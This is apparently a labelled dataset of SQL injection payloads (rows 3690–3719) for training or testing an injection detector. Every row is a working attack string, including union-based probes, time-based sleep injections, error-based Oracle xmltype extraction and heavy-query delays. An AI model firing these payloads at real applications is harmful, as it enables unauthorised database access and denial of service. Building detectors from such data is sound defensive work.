row_index,payload_norm,label,sqli_type_hint
3690,"1"" ) where 2633 = 2633 union all select null,null,null,null#",1,
3691,select sleep ( 5 ) ) ||',1,
3692,"1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""gvlc"" like ""gvlc",1,
3693,"1"" where 5796 = 5796 and sleep ( 5 ) #",1,
3694,1%' and 9127 = 7687--,1,
3695,"1' ) as ybuv where 9641 = 9641 union all select null,null,null,null,null,null,null,null--",1,
3696,"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3697,"-6554' ) ) ) union all select 4384,4384,4384,4384,4384#",1,
3698,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
3699,"1'|| ( select 'cjwx' from dual where 7637 = 7637 and elt ( 9548 = 3991,3991 ) ) ||'",1,
3700,"-1164"" ) union all select 6617,6617,6617,6617,6617,6617--",1,
3701,select ( case when ( 4636 = 1108 ) then 1 else 4636* ( select 4636 from master..sysdatabases ) end ) --,1,
3702,"1"" where 3510 = 3510",1,
3703,"1"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""fbqy"" like ""fbqy",1,
3704,"-8382"" ) ) order by 1--",1,
3705,"1 ) ) as fynx where 9636 = 9636 union all select null,null,null,null,null--",1,
3706,"-9734' ) ) as izbx where 6273 = 6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",1,
3707,-4494 or 5291 = 4452,1,
3708,1 ) ) as izvy where 2569 = 2569,1,
3709,"1 where 8074 = 8074 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
3710,1'+ ( select qydm where 6019 = 6019,1,
3711,1' ) and sleep ( 5 ) and ( 'njud' = 'njud,1,
3712,"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
3713,select ( case when ( 4568 = 4241 ) then 4568 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
3714,-3613%' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',1,
3715,-7242' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'kfff' = 'kfff,1,
3716,"1%"" ) ) union all select null,null#",1,
3717,"1%' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",1,
3718,1 ),1,
3719,"-9145' ) as xyya where 8950 = 8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1,
